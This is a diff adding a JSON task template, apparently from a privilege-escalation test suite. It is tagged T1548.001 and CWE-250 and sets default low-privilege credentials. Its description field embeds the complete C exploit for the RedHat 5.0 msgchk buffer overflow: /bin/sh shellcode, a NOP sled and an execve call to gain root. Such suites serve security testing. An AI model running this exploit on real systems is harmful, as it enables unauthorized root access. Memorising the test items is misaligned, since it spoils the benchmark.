@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19305",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: RedHat Linux 5.0 - 'msgchk' Local Privilege Escalation (OSVDB-83448)\n\nExploit source code (19305.c):\n```\n// source: https://www.securityfocus.com/bid/383/info\n//\n// Similar to the mh vulnerability, a buffer overflow exists in the version of msgchk shipped with RedHat Linux 5.0. The vulnerability allows a user to execute arbritrary commands as root to compromise superuser access.\n//\n#include <stdlib.h>\n\n#define DEFAULT_OFFSET                 0\n#define DEFAULT_BUFFER_SIZE            1018\n#define NOP                            0x90\nchar shellcode[] =\n\n\"\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\"\n\n\"\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\"\n        \"\"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"\";\n\nunsigned long get_sp(void) {\n   __asm__(\"\"movl %esp,%eax\"\");\n}\n\nvoid main(int argc, char *argv[]) {\n  char *buff, *ptr;\nchar *args[5];\nchar jorge[]=\"\"\"\";\n  long *addr_ptr, addr;\n  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;\n  int i;\n  if (argc > 1) bsize  = atoi(argv[1]);\n  if (argc > 2) offset = atoi(argv[2]);\n\n  if (!(buff = malloc(bsize))) {\n    printf(\"\"Can't allocate memory.\\n\"\");\n    exit(0);\n  }\n\n  addr = get_sp() - offset;\n  printf(\"\"Using address: 0x%x\\n\"\", addr);\n\n  ptr = buff;\n  addr_ptr = (long *) ptr;\n  for (i = 0; i < bsize; i+=4) {\n    buff[i]=addr & 0xFF;\n    buff[i+1]=(addr >> 8) & 0xFF;\n    buff[i+2]=(addr >> 16) & 0xFF;\n    buff[i+3]=(addr >> 24) & 0xFF;\n  }\n\n    *(addr_ptr++) = addr;\n\n  for (i = 0; i < bsize/2; i++)\n    buff[i] = NOP;\n\n  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));\n  for (i = 0; i < strlen(shellcode); i++)\n    *(ptr++) = shellcode[i];\n\n  buff[bsize - 1] = '\\0';\n\n  args[0]=\"\"/usr/bin/mh/msgchk\"\";\n  args[1]=\"\"-host\"\";\n  args[2]=buff;\n  args[3]=NULL;\n  execve(args[0],args,NULL);\n\n}\n```",
+  "cve": "OSVDB-83448",
+  "exploitdb_id": "19305",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19305",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
